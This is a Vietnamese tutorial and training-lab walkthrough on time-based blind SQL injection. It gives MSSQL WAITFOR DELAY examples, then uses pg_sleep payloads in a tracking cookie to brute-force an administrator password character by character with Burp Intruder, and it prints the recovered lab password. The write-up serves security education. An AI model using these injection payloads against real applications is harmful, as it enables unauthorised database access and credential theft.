# Exploiting blind SQL injection by triggering time delays

Nếu ứng dụng bắt lỗi từ cơ sở dữ liệu khi thực thi truy vấn SQL và xử lý chúng một cách an toàn, thì sẽ không có sự khác biệt nào trong phản hồi của ứng dụng. Điều này có nghĩa là kỹ thuật gây lỗi có điều kiện trước đó sẽ không hiệu quả.

Trong tình huống này, có thể khai thác lỗ hổng bind SQL Injection bằng cách **kích hoạt độ trễ thời gian** tùy thuộc vào việc điều kiện chèn vào có đúng hay không.

# Exploiting blind SQL injection by triggering time delays - Continued

Các **kỹ thuật kích hoạt độ trễ thời gian** phụ thuộc vào loại cơ sở dữ liệu đang sử dụng. Ví dụ, trên Microsoft SQL Server, có thể sử dụng các truy vấn sau để kiểm tra điều kiện và kích hoạt độ trễ nếu biểu thức điều kiện đúng:

    '; IF (1=2) WAITFOR DELAY '0:0:10'--  
    '; IF (1=1) WAITFOR DELAY '0:0:10'--  

- Truy vấn đầu tiên **không kích hoạt độ trễ**, vì điều kiện **1=2** là sai.

- Truy vấn thứ hai **kích hoạt độ trễ 10 giây**, vì điều kiện **1=1** là đúng.

**Khai thác để trích xuất dữ liệu**

Sử dụng kỹ thuật này, có thể **trích xuất dữ liệu** bằng cách kiểm tra từng ký tự của giá trị **Password**:

    '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--  

- Nếu mật khẩu của tài khoản **Administrator** bắt đầu bằng **một ký tự lớn hơn 'm'**, truy vấn sẽ kích hoạt độ trễ, cho phép kẻ tấn công suy luận giá trị thực tế của mật khẩu từng ký tự một.

**Lưu ý**: Có nhiều cách khác nhau để kích hoạt độ trễ trong truy vấn SQL, và mỗi loại cơ sở dữ liệu sẽ có các phương pháp riêng.

# Lab: Blind SQL injection with time delays and information retrieval

![img](181)

Truy cập lab: 

![img](182)

Chọn category Gifts và intercept request này: 

![img](183)

Website có sử dụng Tracking cookie để theo dõi hành vi của người dùng. 

Thay giá trị TrackingId thành: 

    x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- 

![img](184)

=> Send request và để ý website mấy 10s để response: 

![img](185)

Thay đổi truy vấn thành:

    x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

![img](186)

Send request, để ý lần mày website không chờ mà phản hồi luôn: 

![img](187)

=> Có thể test một điều kiện boolean để kiểm tra kết quả. Thay đổi truy vấn thành: 
    
    x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Send request, để ý phải chờ 10s thì website mới phản hồi => Có username administrator: 

![img](188)

Tiếp theo cần xác định độ dài password, dùng truy vấn: 

    x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Send request, để ý phải chờ 10s thì website mới phản hồi => Độ dài password > 1:

![img](189)

Thay đổi truy vấn thành: 

    x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Send request, website không cần chờ 10s mà phản hồi luôn => độ dài password là 20. 

![img](190)

Tiếp theo cần thử từng ký tự tương ứng với từng vị trí trong password, chuyển request sang Intruder và thay đổi truy vấn thành: 

    x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

![img](191)

Chọn 'a' làm giá trị để brute-force: 

![img](192)

Cài đặt payload:

![img](193)

Cài đặt Resource pool: 

![img](194)

=> Start attack: 

Xem xét kết quả tấn công để tìm giá trị của ký tự tại vị trí đầu tiên. Thấy một cột trong kết quả có tên **Response received**. Cột này thường chứa một số nhỏ, biểu thị số mili-giây mà ứng dụng mất để phản hồi.

Một trong các hàng sẽ có giá trị lớn hơn trong cột này, khoảng 10.000 mili-giây. Payload hiển thị trong hàng đó chính là giá trị của ký tự tại vị trí đầu tiên.

![img](195)

=> Ký tự đầu tiên của password là **m**. Làm tương tự với các ký tự còn lại. 

Tìm được password: m1p43t2nz7ylkkgmci42

Login tài khoản administrator và solved bài lab: 

![img](196)

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
m1p43t2nz7ylkkgmci42